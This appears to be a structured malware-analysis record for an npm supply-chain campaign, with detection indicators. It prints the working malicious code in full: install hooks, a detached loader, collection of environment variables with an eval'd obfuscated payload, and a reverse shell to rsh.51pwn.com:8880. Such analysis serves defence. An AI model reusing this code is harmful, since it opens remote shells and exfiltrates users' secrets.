@@ -1,0 +1,169 @@
+{
+  "package_info": {
+    "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+    "package_manager": "npm",
+    "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+    "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "preinstall/postinstall/test/init",
+        "file_location": "package.json (scripts section)",
+        "required_permissions": [
+          "filesystem",
+          "process",
+          "network"
+        ]
+      },
+      "code_snippet": "\"scripts\": {\n  \"preinstall\": \"node ./scripts/init.js &\",\n  \"postinstall\": \"node ./scripts/init.js &\",\n  \"test\": \"node ./scripts/init.js &\",\n  \"init\": \"node ./scripts/init.js\"\n}",
+      "code_language": "json",
+      "code_behavior": "During preinstall, postinstall, test, or init lifecycle events, the package executes ./scripts/init.js using Node.js, launching the malicious payload regardless of how the package is installed or tested, resulting in the initiation of the attack chain.",
+      "malice_analysis": {
+        "why_suspicious": "Executing arbitrary scripts across multiple npm lifecycle hooks is highly unusual and increases the attack surface, especially when the same script is triggered on install, test, and init events.",
+        "violated_expectations": "Legitimate npm packages rarely, if ever, run custom scripts on install/test/init unless absolutely necessary and clearly documented. Running the same script on all hooks is not standard practice.",
+        "similar_legitimate_use": "Some packages use install scripts for native module compilation or environment setup, but not for launching detached or persistent processes, and not across all lifecycle hooks.",
+        "key_indicators": [
+          "Multiple npm lifecycle hooks (preinstall, postinstall, test, init) trigger the same script",
+          "No legitimate documentation or justification for running code on install/test/init",
+          "Use of background process launch syntax (&) in npm scripts"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "preinstall/postinstall/test/init (via init.js)",
+        "file_location": "scripts/init.js",
+        "required_permissions": [
+          "filesystem",
+          "process"
+        ]
+      },
+      "code_snippet": "require(\"child_process\").fork(\"scripts/rsh.js\",{detached: true});\nprocess.exit();",
+      "code_language": "javascript",
+      "code_behavior": "When executed by the npm lifecycle scripts, the code in scripts/init.js launches scripts/rsh.js as a detached child process using Node.js's child_process.fork, then immediately exits the parent process, allowing the malicious code to persist in the background after installation or testing.",
+      "malice_analysis": {
+        "why_suspicious": "Spawning a detached child process during install or test is highly abnormal and is a common technique for establishing persistence and hiding malicious activity from the main process.",
+        "violated_expectations": "Install or test scripts should not launch persistent background processes or fork additional scripts without clear, legitimate purpose.",
+        "similar_legitimate_use": "Rarely, daemons or background services might be started by legitimate packages, but this is not standard for npm packages and should be clearly documented and justified.",
+        "key_indicators": [
+          "Detached child process launched via child_process.fork with {detached: true}",
+          "Immediate process.exit() to conceal ongoing malicious activity",
+          "Background persistence established during install/test"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (when rsh.js is executed)",
+        "file_location": "scripts/rsh.js",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars",
+          "process"
+        ]
+      },
+      "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+      "malice_analysis": {
+        "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+        "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+        "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+        "key_indicators": [
+          "Obfuscated and base64-encoded payload decompressed and executed via eval",
+          "Systematic collection of system, environment, and user data",
+          "Manipulation of environment variables to bypass security controls",
+          "No user notification or consent for data collection or code execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (eval(s1) in rsh.js)",
+        "file_location": "decompressed payload (s1)",
+        "required_permissions": [
+          "network",
+          "process",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "var config = { host: \"rsh.51pwn.com\", port: 8880 },\n    net = require(\"net\"),\n    cp = require(\"child_process\"),\n    client = new net.Socket(),\n    reConn = () => {client.connect(config.port, config.host)};\nclient.on(\"connect\", () => {\n    var command = (process.platform === \"win32\" ? \"cmd /c start /b cmd\" : \"/bin/sh\").split(\" \"),\n    sh = cp.spawn(command[0], command.slice(1));\n    client.pipe(sh.stdin);\n    sh.stdout.pipe(client);\n    sh.stderr.pipe(client);\n    client.write(\"51pwn_npm\\n\");\n    client.write(s + \"\\n\");\n    sh.on(\"exit\", (code) => { if (code === 1) { reConn() } })\n});\nclient.on(\"close\", () => {reConn()});\nclient.on(\"error\", (e) => {});\nreConn();\nprocess.on(\"exit\", () => {process.exitCode = 0;reConn()});",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the decompressed payload establishes a persistent TCP connection to rsh.51pwn.com:8880, sends the previously collected and compressed system information, and spawns a shell (cmd or /bin/sh) to provide the attacker with remote command execution capabilities. The code includes reconnection logic to maintain persistence and ensure the reverse shell remains active.",
+      "malice_analysis": {
+        "why_suspicious": "Establishing a reverse shell to a hardcoded external server, exfiltrating system data, and enabling remote command execution are direct indicators of a backdoor and remote access trojan.",
+        "violated_expectations": "No legitimate npm package should open a reverse shell, exfiltrate system data, or provide remote shell access to an external server.",
+        "similar_legitimate_use": "There are no legitimate use cases for reverse shells or persistent C2 connections in npm packages.",
+        "key_indicators": [
+          "Hardcoded C2 domain (rsh.51pwn.com) and port (8880)",
+          "Persistent reconnection logic to maintain remote access",
+          "Shell spawned and piped to remote socket for command execution",
+          "Initial exfiltration of collected system information"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Execution of scripts/init.js"
+    },
+    {
+      "step": 2,
+      "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Execution of scripts/rsh.js in the background"
+    },
+    {
+      "step": 3,
+      "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Execution of reverse shell payload from decompressed code"
+    },
+    {
+      "step": 4,
+      "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+      "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+      "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+      "Use of eval to execute dynamically decompressed or generated code",
+      "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+      "Collection and exfiltration of system, environment, and user data during package installation or execution"
+    ],
+    "file_indicators": [
+      "scripts/init.js",
+      "scripts/rsh.js",
+      "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+      "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+    ],
+    "network_indicators": [
+      "rsh.51pwn.com:8880",
+      "Outbound TCP connections to rsh.51pwn.com on port 8880",
+      "Initial data exfiltration containing compressed system information"
+    ],
+    "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+  }
+}
